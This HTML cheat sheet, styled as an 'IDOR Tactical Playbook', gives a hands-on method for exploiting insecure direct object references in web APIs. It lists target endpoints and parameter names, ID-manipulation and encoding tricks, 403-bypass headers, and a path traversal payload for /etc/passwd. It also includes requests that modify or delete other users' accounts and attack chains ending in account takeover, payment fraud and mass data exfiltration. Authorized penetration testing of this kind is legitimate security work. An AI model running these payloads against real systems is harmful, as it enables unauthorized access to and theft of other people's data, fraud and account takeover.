<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IDOR TACTICAL PLAYBOOK - PURE HUNTING</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0c0f;
            font-family: 'Courier New', 'Fira Code', monospace;
            color: #d4d4d4;
            line-height: 1.5;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            border: 1px solid #2a2a2a;
        }
        
        .header {
            background: #000000;
            padding: 20px;
            border-bottom: 3px solid #ff4444;
        }
        
        .header h1 {
            color: #ff4444;
            font-size: 2.2em;
            letter-spacing: -1px;
        }
        
        .header .sub {
            color: #666;
            font-size: 0.9em;
        }
        
        .grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 1px;
            background: #1a1a1a;
        }
        
        .panel {
            background: #0f0f0f;
            padding: 20px;
            border: 1px solid #2a2a2a;
        }
        
        .panel h2 {
            color: #ff4444;
            font-size: 1.3em;
            margin-bottom: 15px;
            border-bottom: 1px solid #333;
            padding-bottom: 5px;
        }
        
        .panel h3 {
            color: #ffaa00;
            font-size: 1.1em;
            margin: 15px 0 8px 0;
        }
        
        .list {
            list-style: none;
        }
        
        .list li {
            padding: 4px 0 4px 20px;
            position: relative;
            font-size: 0.9em;
            color: #ccc;
        }
        
        .list li:before {
            content: "‚Ä∫";
            color: #ff4444;
            position: absolute;
            left: 5px;
        }
        
        .param-cloud {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
            margin: 10px 0;
        }
        
        .param {
            background: #1a1a1a;
            color: #ffaa00;
            padding: 3px 8px;
            font-size: 0.8em;
            border: 1px solid #333;
            font-family: monospace;
        }
        
        .code {
            background: #000000;
            padding: 12px;
            border-left: 3px solid #ff4444;
            font-family: 'Courier New', monospace;
            font-size: 0.85em;
            color: #a0ffa0;
            margin: 10px 0;
            white-space: pre-wrap;
            border-radius: 0;
        }
        
        .sign {
            background: #1a0000;
            border-left: 3px solid #ff0000;
            padding: 10px;
            margin: 8px 0;
            font-size: 0.9em;
        }
        
        .step {
            background: #111111;
            padding: 10px;
            margin: 8px 0;
            border-left: 3px solid #ffaa00;
            counter-increment: step-counter;
        }
        
        .step:before {
            content: counter(step-counter) ". ";
            color: #ffaa00;
            font-weight: bold;
            margin-right: 5px;
        }
        
        .two-col {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        .footer {
            background: #000;
            padding: 15px;
            text-align: center;
            border-top: 1px solid #333;
            color: #666;
            font-size: 0.8em;
        }
        
        hr {
            border: none;
            border-top: 1px solid #333;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>‚ö° IDOR TACTICAL PLAYBOOK ‚ö°</h1>
            <div class="sub">pure hunting edition | no theory | only action</div>
        </div>
        
        <!-- ROW 1: WHERE TO LOOK -->
        <div class="grid">
            <div class="panel">
                <h2>üìç URL PATTERNS</h2>
                <div class="param-cloud">
                    <span class="param">/api/user/</span>
                    <span class="param">/profile/</span>
                    <span class="param">/account/</span>
                    <span class="param">/orders/</span>
                    <span class="param">/invoices/</span>
                    <span class="param">/messages/</span>
                    <span class="param">/documents/</span>
                    <span class="param">/download/</span>
                    <span class="param">/export/</span>
                    <span class="param">/private/</span>
                    <span class="param">/internal/</span>
                    <span class="param">/admin/</span>
                    <span class="param">/debug/</span>
                    <span class="param">/test/</span>
                    <span class="param">/dev/</span>
                    <span class="param">/v1/</span>
                    <span class="param">/v2/</span>
                    <span class="param">/beta/</span>
                    <span class="param">/staging/</span>
                </div>
                
                <h3 style="margin-top: 20px;">üìå PARAMETER NAMES</h3>
                <div class="param-cloud">
                    <span class="param">id</span> <span class="param">user_id</span> <span class="param">account_id</span>
                    <span class="param">profile_id</span> <span class="param">uid</span> <span class="param">pid</span>
                    <span class="param">guid</span> <span class="param">uuid</span> <span class="param">number</span>
                    <span class="param">order_id</span> <span class="param">invoice_id</span> <span class="param">transaction_id</span>
                    <span class="param">file_id</span> <span class="param">document_id</span> <span class="param">attachment_id</span>
                    <span class="param">msg_id</span> <span class="param">message_id</span> <span class="param">ticket_id</span>
                    <span class="param">token</span> <span class="param">key</span> <span class="param">api_key</span>
                    <span class="param">reference</span> <span class="param">ref</span> <span class="param">code</span>
                    <span class="param">email</span> <span class="param">username</span> <span class="param">login</span>
                    <span class="param">slug</span> <span class="param">permalink</span> <span class="param">post_id</span>
                    <span class="param">article_id</span> <span class="param">product_id</span> <span class="param">item_id</span>
                    <span class="param">cart_id</span> <span class="param">session_id</span> <span class="param">device_id</span>
                    <span class="param">customer_id</span> <span class="param">vendor_id</span> <span class="param">team_id</span>
                    <span class="param">group_id</span> <span class="param">org_id</span> <span class="param">company_id</span>
                </div>
            </div>
            
            <div class="panel">
                <h2>üîç WHERE IDS HIDE</h2>
                <ul class="list">
                    <li>URL path segments (/user/123/profile)</li>
                    <li>Query parameters (?id=123&user=456)</li>
                    <li>POST/PUT JSON bodies</li>
                    <li>XML requests</li>
                    <li>GraphQL queries</li>
                    <li>File upload names</li>
                    <li>Download links</li>
                    <li>Export functions</li>
                    <li>Webhook URLs</li>
                    <li>Callback URLs</li>
                    <li>Redirect parameters</li>
                    <li>Hidden form fields</li>
                    <li>HTML comments</li>
                    <li>JavaScript variables</li>
                    <li>Image URLs (/avatars/123.jpg)</li>
                    <li>CSS backgrounds</li>
                    <li>Meta tags</li>
                    <li>Local storage</li>
                    <li>Session storage</li>
                    <li>Cookies</li>
                    <li>WebSocket messages</li>
                    <li>Server-sent events</li>
                    <li>API responses (other endpoints)</li>
                    <li>Error messages</li>
                    <li>Debug pages</li>
                </ul>
            </div>
            
            <div class="panel">
                <h2>üéØ HIGH-VALUE ENDPOINTS</h2>
                <ul class="list">
                    <li>/api/user/profile</li>
                    <li>/api/user/settings</li>
                    <li>/api/user/payment</li>
                    <li>/api/user/billing</li>
                    <li>/api/orders/history</li>
                    <li>/api/orders/details</li>
                    <li>/api/messages/inbox</li>
                    <li>/api/messages/thread</li>
                    <li>/api/documents/list</li>
                    <li>/api/documents/view</li>
                    <li>/api/files/download</li>
                    <li>/api/export/data</li>
                    <li>/api/admin/users</li>
                    <li>/api/admin/logs</li>
                    <li>/api/internal/debug</li>
                    <li>/api/internal/health</li>
                    <li>/api/v2/private</li>
                    <li>/graphql (user queries)</li>
                    <li>/api/webhooks</li>
                    <li>/api/callbacks</li>
                    <li>/api/impersonate</li>
                    <li>/api/sudo</li>
                    <li>/api/switch-user</li>
                </ul>
            </div>
        </div>
        
        <!-- ROW 2: SIGNS & STEPS -->
        <div class="grid">
            <div class="panel">
                <h2>üö© SIGNS OF IDOR</h2>
                
                <div class="sign">
                    <strong>200 OK</strong> when accessing another user's resource
                </div>
                
                <div class="sign">
                    <strong>Response contains</strong> other users' data (names, emails, addresses)
                </div>
                
                <div class="sign">
                    <strong>ID in URL</strong> is predictable (1001, 1002, 1003)
                </div>
                
                <div class="sign">
                    <strong>No authorization check</strong> on DELETE/PUT/PATCH
                </div>
                
                <div class="sign">
                    <strong>UUID/GUID</strong> found in public source works in private endpoints
                </div>
                
                <div class="sign">
                    <strong>Different response sizes</strong> for different users (even if 403)
                </div>
                
                <div class="sign">
                    <strong>Response time differences</strong> (blind IDOR indicator)
                </div>
                
                <div class="sign">
                    <strong>Error messages</strong> reveal existence of objects
                </div>
                
                <div class="sign">
                    <strong>Batch operations</strong> accept multiple IDs
                </div>
                
                <div class="sign">
                    <strong>Export functions</strong> include all users
                </div>
                
                <div class="sign">
                    <strong>API returns</strong> "Internal ID" fields
                </div>
                
                <div class="sign">
                    <strong>Webhook/Callback</strong> contains user identifiers
                </div>
            </div>
            
            <div class="panel">
                <h2>üìã TESTING STEPS</h2>
                
                <div style="counter-reset: step-counter;">
                    <div class="step">Create 3 accounts: UserA, UserB, Admin</div>
                    <div class="step">Login as UserA, browse normally, capture all requests</div>
                    <div class="step">Note every ID, UUID, reference in URLs and responses</div>
                    <div class="step">Logout UserA completely</div>
                    <div class="step">Login as UserB</div>
                    <div class="step">Take each request from UserA, replace with UserB's session</div>
                    <div class="step">Modify IDs: +1, -1, 0, 999999, negative</div>
                    <div class="step">Try same IDs in different HTTP methods (PUT, DELETE, PATCH)</div>
                    <div class="step">Test while logged out entirely</div>
                    <div class="step">Try IDs found in public places (profiles, JS, HTML)</div>
                    <div class="step">Test batch endpoints with multiple IDs</div>
                    <div class="step">Try parameter pollution: id=123&id=456</div>
                    <div class="step">Test encoded versions: base64, hex, double URL encode</div>
                    <div class="step">Check if you can access admin endpoints with user IDs</div>
                </div>
            </div>
            
            <div class="panel">
                <h2>‚ö° QUICK TEST SEQUENCE</h2>
                
                <div class="code">
# Found this:
GET /api/user/123

# Test immediately:
GET /api/user/124
GET /api/user/122
GET /api/user/0
GET /api/user/-1
GET /api/user/999999
PUT /api/user/123
DELETE /api/user/123
PATCH /api/user/123
POST /api/user/123

# With different session:
Cookie: session=attacker
GET /api/user/123

# Logged out:
(no cookie)
GET /api/user/123

# Parameter pollution:
GET /api/user?id=123&id=124
GET /api/user?user_id=123&user_id=124
GET /api/user?ids[]=123&ids[]=124

# Encoding:
GET /api/user/MTIz      (base64 of 123)
GET /api/user/MTI0      (base64 of 124)
GET /api/user/%31%32%33 (URL encode)
GET /api/user/%31%32%34
                </div>
            </div>
        </div>
        
        <!-- ROW 3: TECHNIQUES -->
        <div class="grid">
            <div class="panel">
                <h2>üîß MANIPULATION TECHNIQUES</h2>
                
                <h3>Numeric IDs</h3>
                <div class="code">
1001 ‚Üí 1002, 1000, 1003, 1100, 900, 0, -1, 999999, 1001.0
                </div>
                
                <h3>UUID/GUID</h3>
                <div class="code">
a1b2c3d4 ‚Üí a1b2c3d5, a1b2c3d6, or find in public profile
                </div>
                
                <h3>Base64</h3>
                <div class="code">
MTIz (123) ‚Üí MTI0 (124), MTI1 (125)
dXNlcjoxMjM= (user:123) ‚Üí dXNlcjoxMjQ=
                </div>
                
                <h3>Email/Username</h3>
                <div class="code">
user@test.com ‚Üí victim@test.com, admin@test.com
john.doe ‚Üí jane.doe, admin, root
                </div>
                
                <h3>File paths</h3>
                <div class="code">
/download/123.pdf ‚Üí /download/124.pdf
/file/user_123.jpg ‚Üí /file/user_124.jpg
/download?file=123.txt ‚Üí ../../../etc/passwd
                </div>
                
                <h3>JSON/GraphQL</h3>
                <div class="code">
{"user_id": 123} ‚Üí {"user_id": 124}
{"user":{"id":123}} ‚Üí {"user":{"id":124}}
query { user(id:123) } ‚Üí query { user(id:124) }
                </div>
                
                <h3>Array/Wildcard</h3>
                <div class="code">
ids=123 ‚Üí ids=123,124,125
ids[]=123 ‚Üí ids[]=123&ids[]=124
id=123 ‚Üí id=*, id=123|124, id=123%2C124
                </div>
            </div>
            
            <div class="panel">
                <h2>üß™ BLIND IDOR TESTS</h2>
                
                <div class="code">
# 1. Export functions
POST /api/export
{"user_ids": [123, 124]}
‚Üí Does export include unauthorized data?

# 2. Email notifications
POST /api/reset-password
{"email": "victim@test.com"}
‚Üí Does attacker get email?

# 3. Logs/Audit
GET /api/audit-logs?user=123
‚Üí Can you see other users' actions?

# 4. Response size diff
GET /api/user/123 ‚Üí 2450 bytes
GET /api/user/124 ‚Üí 3120 bytes (different user, different data size)

# 5. Response time diff
GET /api/user/123 ‚Üí 120ms
GET /api/user/124 ‚Üí 850ms (maybe processing more data)

# 6. Caching behavior
GET /api/user/123 ‚Üí 200 OK (cached)
GET /api/user/124 ‚Üí 404 (not cached) ‚Üí user 124 exists but 404?

# 7. Status codes
200 vs 403 vs 404 differences leak existence

# 8. Error messages
"User 123 not found" vs "Access denied" ‚Üí different meanings
                </div>
            </div>
            
            <div class="panel">
                <h2>‚õìÔ∏è CHAINING STEPS</h2>
                
                <div class="code">
# Chain 1: Account Takeover
1. IDOR to leak email: /profile/124 ‚Üí victim@email.com
2. IDOR to leak reset tokens: /reset-tokens?email=victim
3. Use token to reset password
4. Account takeover

# Chain 2: Admin Access
1. IDOR to leak roles: /user/123/role ‚Üí "admin"
2. IDOR to list admin endpoints: /admin/endpoints
3. Access admin API: /admin/users/export
4. Full data breach

# Chain 3: Payment Fraud
1. IDOR to payment methods: /payment/123 ‚Üí card details
2. IDOR to orders: /orders?user=123
3. IDOR to refund: /refund?order=456
4. Financial fraud

# Chain 4: Data Exfiltration
1. IDOR to user list: /api/users?start=0&count=100
2. IDOR to each user's documents
3. IDOR to download each document
4. Mass data breach
                </div>
            </div>
        </div>
        
        <!-- ROW 4: METHOD TESTING & HTTP VERBS -->
        <div class="grid">
            <div class="panel">
                <h2>üåê HTTP METHOD TESTING</h2>
                
                <div class="code">
Original: GET /api/resource/123

TEST ALL METHODS:
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
GET      - view resource
POST     - create with that ID (if accepted)
PUT      - update resource
DELETE   - delete resource
PATCH    - partial update
OPTIONS  - see allowed methods
HEAD     - check existence (no body)

REAL EXAMPLE:
PUT /api/user/123
{
  "email": "attacker@test.com",
  "role": "admin"
}
‚Üí If accepted, you just modified user 123
                </div>
            </div>
            
            <div class="panel">
                <h2>üì¶ BATCH OPERATIONS</h2>
                
                <div class="code">
# Single ID
GET /api/users/123

# Multiple IDs
GET /api/users?id=123,124,125
GET /api/users?ids[]=123&ids[]=124
POST /api/users/batch
{"ids": [123,124,125]}

# Range
GET /api/users?start=100&end=200
GET /api/export?from=1000&to=2000

# Wildcard
GET /api/users?id=*
GET /api/admin/impersonate?user=*

# If batch works, you can dump all users
                </div>
            </div>
            
            <div class="panel">
                <h2>üîç JS/HTML ID SOURCES</h2>
                
                <div class="code">
# Check these in source:

HTML Comments:
<!-- User ID: 12345 -->
<!-- order: INV-2024-001 -->

JavaScript:
const userId = '12345';
var account_id = "a1b2c3d4";
let orderRef = "ORD-789";
window.user = {id: 678};

Data attributes:
<div data-user-id="123">
<div data-order="456">

Image URLs:
<img src="/avatars/123.jpg">
<img src="/files/abc123.pdf">

Meta tags:
<meta name="user-id" content="123">

Local Storage:
localStorage.getItem('userId')
sessionStorage.userToken

API Responses (check all):
Look for "id", "uid", "ref" in JSON
                </div>
            </div>
        </div>
        
        <!-- ROW 5: ENCODING & BYPASS -->
        <div class="grid">
            <div class="panel">
                <h2>üîÑ ENCODING TECHNIQUES</h2>
                
                <div class="code">
Original: 123

URL Encode:
%31%32%33 ‚Üí 123
%31%32%34 ‚Üí 124

Double URL Encode:
%2531%2532%2533 ‚Üí 123
%2531%2532%2534 ‚Üí 124

Base64:
MTIz ‚Üí 123
MTI0 ‚Üí 124
dXNlcjoxMjM= ‚Üí user:123
dXNlcjoxMjQ= ‚Üí user:124

Hex:
0x7b ‚Üí 123
0x7c ‚Üí 124

Unicode:
\u0031\u0032\u0033 ‚Üí 123

HTML entities:
&#49;&#50;&#51; ‚Üí 123

Octal:
\063\062\061 ‚Üí 321 (reversed sometimes)

Mixed:
%31%32%33 ‚Üí try with 124 in same format
                </div>
            </div>
            
            <div class="panel">
                <h2>üö´ 403/401 BYPASS TESTS</h2>
                
                <div class="code">
If you get 403/401, try:

# HTTP method switch
GET ‚Üí POST, PUT, DELETE, PATCH

# Headers
X-Original-URL: /admin/real-endpoint
X-Rewrite-URL: /admin/real-endpoint
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost

# Path variations
/admin ‚Üí /admin/, /./admin, //admin
/api/user/123 ‚Üí /api/v1/user/123, /api/v2/user/123

# Case changing
/ADMIN/user/123
/Admin/User/123

# Extension append
/api/user/123 ‚Üí /api/user/123.json, /api/user/123?id=123

# Parameter pollution
?id=123&id=124 (if first is validated, second might be used)
                </div>
            </div>
            
            <div class="panel">
                <h2>üìä RESPONSE ANALYSIS</h2>
                
                <div class="code">
What to look for in responses:

200 OK + data = IDOR confirmed

200 OK but empty = maybe object exists but empty
200 OK with different size = different user data

403 Forbidden = good (auth works)
404 Not Found = object may not exist (or hidden)

Response time:
200ms = quick rejection
800ms = maybe processed something

Headers:
X-User-ID: 123
X-Internal-ID: abc123

JSON fields:
"user_id", "account_id", "ref_id", "uid"
"internal_id", "debug_id", "trace_id"

Error messages:
"User 123 not found" (user 123 doesn't exist)
"Access denied for user 123" (user 123 exists!)
                </div>
            </div>
        </div>
        
        <!-- ROW 6: QUICK REFERENCE -->
        <div class="grid">
            <div class="panel">
                <h2>‚ö° 60-SECOND IDOR CHECK</h2>
                
                <div class="code">
1. Pick any endpoint with ID
   /api/user/123

2. Change ID by +1
   /api/user/124

3. Change cookie to different user
   (if you have 2 accounts)

4. Try while logged out

5. Try DELETE method
   DELETE /api/user/123

6. Check if ID appears in response
   (maybe they leak other IDs)

If any returns 200 with data ‚Üí IDOR
                </div>
            </div>
            
            <div class="panel">
                <h2>üìã DAILY HUNT CHECKLIST</h2>
                
                <div class="code">
[ ] Found numeric param? Try +1, -1, 0
[ ] Found UUID? Look in public profiles
[ ] Found endpoint? Test while logged out
[ ] Found file download? Try path traversal
[ ] Found API? Try other users' IDs
[ ] Found POST? Try changing ID in body
[ ] Found DELETE? Try deleting others
[ ] Found batch? Try adding more IDs
[ ] Found export? Check if includes all
[ ] Found JS? grep for "id", "user", "uid"
[ ] Found HTML? check comments, attributes
[ ] Found response? Note all IDs returned
[ ] Tested all HTTP methods?
[ ] Tested with different accounts?
                </div>
            </div>
            
            <div class="panel">
                <h2>üí£ CRITICAL IDOR PATTERNS</h2>
                
                <div class="code">
MOST DANGEROUS:

/api/admin/users/{id}
/api/internal/debug/{id}
/api/impersonate?user={id}
/api/sudo?as={id}
/api/users/reset-password/{id}
/api/payment/methods/{id}
/api/documents/private/{id}
/api/messages/attachments/{id}
/api/export/all?user={id}
/api/batch?ids={id},{id}
/api/migrate?from={id}&to={id}
/api/merge?primary={id}&secondary={id}
                </div>
            </div>
        </div>
        
        <div class="footer">
            IDOR TACTICAL PLAYBOOK v1.0 | PURE HUNTING EDITION | TEST EVERY ID, EVERYWHERE, ALWAYS
        </div>
    </div>
</body>
</html>
